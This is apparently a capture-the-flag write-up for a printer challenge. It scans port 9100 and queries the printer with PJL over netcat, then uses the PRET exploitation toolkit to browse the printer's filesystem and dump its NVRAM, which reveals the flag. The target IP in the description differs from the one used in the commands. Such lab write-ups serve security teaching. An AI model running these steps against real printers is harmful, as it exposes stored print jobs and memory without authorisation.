# We're Back

## Description
* Target IP: 18.116.82.37


## Solution

We've given an IP address and port to work with. Nmap scan reveals that this is jetdirect service. 

```bash
nmap -p9100 -Pn 18.117.184.236
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-27 02:53 EDT
Nmap scan report for ec2-18-117-184-236.us-east-2.compute.amazonaws.com (18.117.184.236)
Host is up (0.62s latency).

PORT     STATE SERVICE
9100/tcp open  jetdirect
```

Searching online reveals that this is default port used for Network Printers. They manage printing jobs using printer control languages such as PJL, PostScript, PCL. Let's enumerate the printer language used in target printer. 

```bash
echo "@PJL INFO ID" | nc 18.117.184.236 9100
@PJL INFO ID
hp LaserJet 4200
```

This is successful and we see target printer processed the PJL language input. We know aware of printer model. There's an excellent printer exploitation toolkit available which can be cloned from [PRET](https://github.com/RUB-NDS/PRET) github repository. 

```bash
git clone https://github.com/RUB-NDS/PRET
```

We can now use the tool to gain access to additional features of printer. 

```bash
python3 pret.py 18.117.184.236 pjl
      ________________                                             
    _/_______________/|                                            
   /___________/___//||   PRET | Printer Exploitation Toolkit v0.40
  |===        |----| ||    by Jens Mueller <jens.a.mueller@rub.de> 
  |           |   ô| ||                                            
  |___________|   ô| ||                                            
  | ||/.´---.||    | ||      「 pentesting tool that made          
  |-||/_____\||-.  | |´         dumpster diving obsolete‥ 」       
  |_||=L==H==||_|__|/                                              
                                                                   
     (ASCII art by                                                 
     Jan Foerster)                                                 
                                                                   
Connection to 18.117.184.236 established
Device:   HeistCorp LaserJet 4ML

Welcome to the pret shell. Type help or ? to list commands.
18.117.184.236:/> 
```

Typing `ls` we see filesystem information. 

```bash
18.117.184.236:/> ls
d        -   pjl
```

We can try to gain access to printer jobs if there are any those are queued or in progress. 

```bash
18.117.184.236:/> ls pjl/jobs/
-        0   queued
```

We don't find much in there. Reading more about printer attacks we find a good reference [hacking-printers](http://hacking-printers.net/wiki/index.php/Main_Page) which talks about most common attacks that are possible. Trying one by one we come across memory access attack path by dumping NVRAM of the target printer. Let's try it out. 

```bash
18.117.184.236:/> nvram dump
Writing copy to nvram/18.117.184.236
Program Error (a bytes-like object is required, not 'str')
```

This fails. Lets try with python2 since it has formatting issues. 

```bash
18.117.184.236:/> nvram dump
Writing copy to nvram/18.117.184.236
..................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................k.e.y............A.C.V.C.T.F.{.m.3.m._.l.3.4.k.s._.<.3.}()
```

This gives the key which is flag.
